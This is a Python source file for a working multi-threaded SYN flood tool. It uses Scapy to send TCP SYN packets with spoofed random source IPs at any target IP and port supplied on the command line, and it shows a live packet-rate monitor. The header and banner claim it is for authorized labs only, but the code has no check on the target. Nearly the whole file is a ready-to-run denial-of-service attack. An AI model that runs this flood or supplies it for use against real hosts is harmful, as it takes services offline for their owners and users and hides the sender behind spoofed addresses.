#!/usr/bin/env python3
"""
Advanced SYN Flood Attack Module
Multi-threaded SYN flood simulation for authorized lab testing.
Author: CyberGuard-Anil

ETHICAL USE ONLY!
Only use in environments you own or have explicit written authorization for.
Misuse of this tool is illegal and strictly prohibited!
"""

import sys
import time
import random
import threading
import argparse
import os
import logging
from scapy.all import *

# --- Ensure results directory exists before logging ---
def ensure_log_dir():
    results_dir = os.path.join(os.path.dirname(__file__), '..', 'results')
    os.makedirs(results_dir, exist_ok=True)
    return os.path.join(results_dir, 'attack_errors.log')

LOG_FILE = ensure_log_dir()
MAX_LOG_SIZE = 1024 * 1024  # 1MB

def rotate_log():
    if os.path.isfile(LOG_FILE) and os.path.getsize(LOG_FILE) > MAX_LOG_SIZE:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        os.rename(LOG_FILE, f"{LOG_FILE}.{timestamp}")

rotate_log()
logging.basicConfig(
    filename=LOG_FILE,
    filemode='a',
    format='%(asctime)s %(levelname)s:%(message)s',
    level=logging.ERROR
)

def print_banner():
    print("""
╔══════════════════════════════════════════════════════╗
║             SYN Flood Educational Tool                                     ║
║      Only for authorized/academic environments!                  ║
╚══════════════════════════════════════════════════════╝
""")

def is_root():
    # Check for root/admin permissions (required for Scapy raw sockets)
    return os.geteuid() == 0

class SynFlooder:
    """
    Multi-threaded SYN Flooder using Scapy.
    """
    def __init__(self, target, port, duration, threads=100):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stop_event = threading.Event()
        self.packets_sent = 0
        self.lock = threading.Lock()

    def random_ip(self):
        """Generate random source IP for spoofing."""
        return ".".join(str(random.randint(1, 254)) for _ in range(4))

    def send_syn_packets(self, thread_id):
        """Continuously send SYN packets with spoofed source IPs."""
        while not self.stop_event.is_set():
            try:
                src_ip = self.random_ip()
                src_port = random.randint(1024, 65535)
                packet = IP(src=src_ip, dst=self.target) / \
                         TCP(sport=src_port, dport=self.port, flags="S", 
                             seq=random.randint(0, 4294967295))
                send(packet, verbose=0)
                with self.lock:
                    self.packets_sent += 1
                time.sleep(0.001)
            except Exception as e:
                logging.error(f"[Thread {thread_id}] {e}")
                break

    def monitor_progress(self):
        """Show status in real-time: packet count, rate, and time remaining."""
        start_time = time.time()
        while not self.stop_event.is_set():
            elapsed = time.time() - start_time
            rate = self.packets_sent / max(elapsed, 1)
            remaining = max(0, self.duration - elapsed)
            print(f"\r[SYN FLOOD] Sent: {self.packets_sent} | Rate: {rate:.1f}/s | Remaining: {remaining:.1f}s", end='', flush=True)
            time.sleep(1)

    def start_attack(self):
        """Launch all flood threads and monitor for duration."""
        print(f"\n[+] Target: {self.target}:{self.port} | Duration: {self.duration}s | Threads: {self.threads}")
        print("[+] SYN packets have spoofed source IPs")
        threads = []
        monitor = threading.Thread(target=self.monitor_progress, daemon=True)
        monitor.start()
        for i in range(self.threads):
            t = threading.Thread(target=self.send_syn_packets, args=(i,), daemon=True)
            threads.append(t)
            t.start()
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user.")
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)
        print(f"\n[Complete] Total packets sent: {self.packets_sent}")

def main():
    print_banner()
    if not is_root():
        print("[!] Warning: This script may require root/admin privileges for raw socket packet sending.\n")
    parser = argparse.ArgumentParser(description="Authorized SYN Flood Attack Simulator (for labs)")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration (seconds)")
    parser.add_argument("-r", "--threads", type=int, default=100, help="Number of threads")
    args = parser.parse_args()

    try:
        flooder = SynFlooder(args.target, args.port, args.duration, args.threads)
        flooder.start_attack()
    except Exception as e:
        logging.error(f"Uncaught error in main: {e}")
        print(f"\n[ERROR] {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()

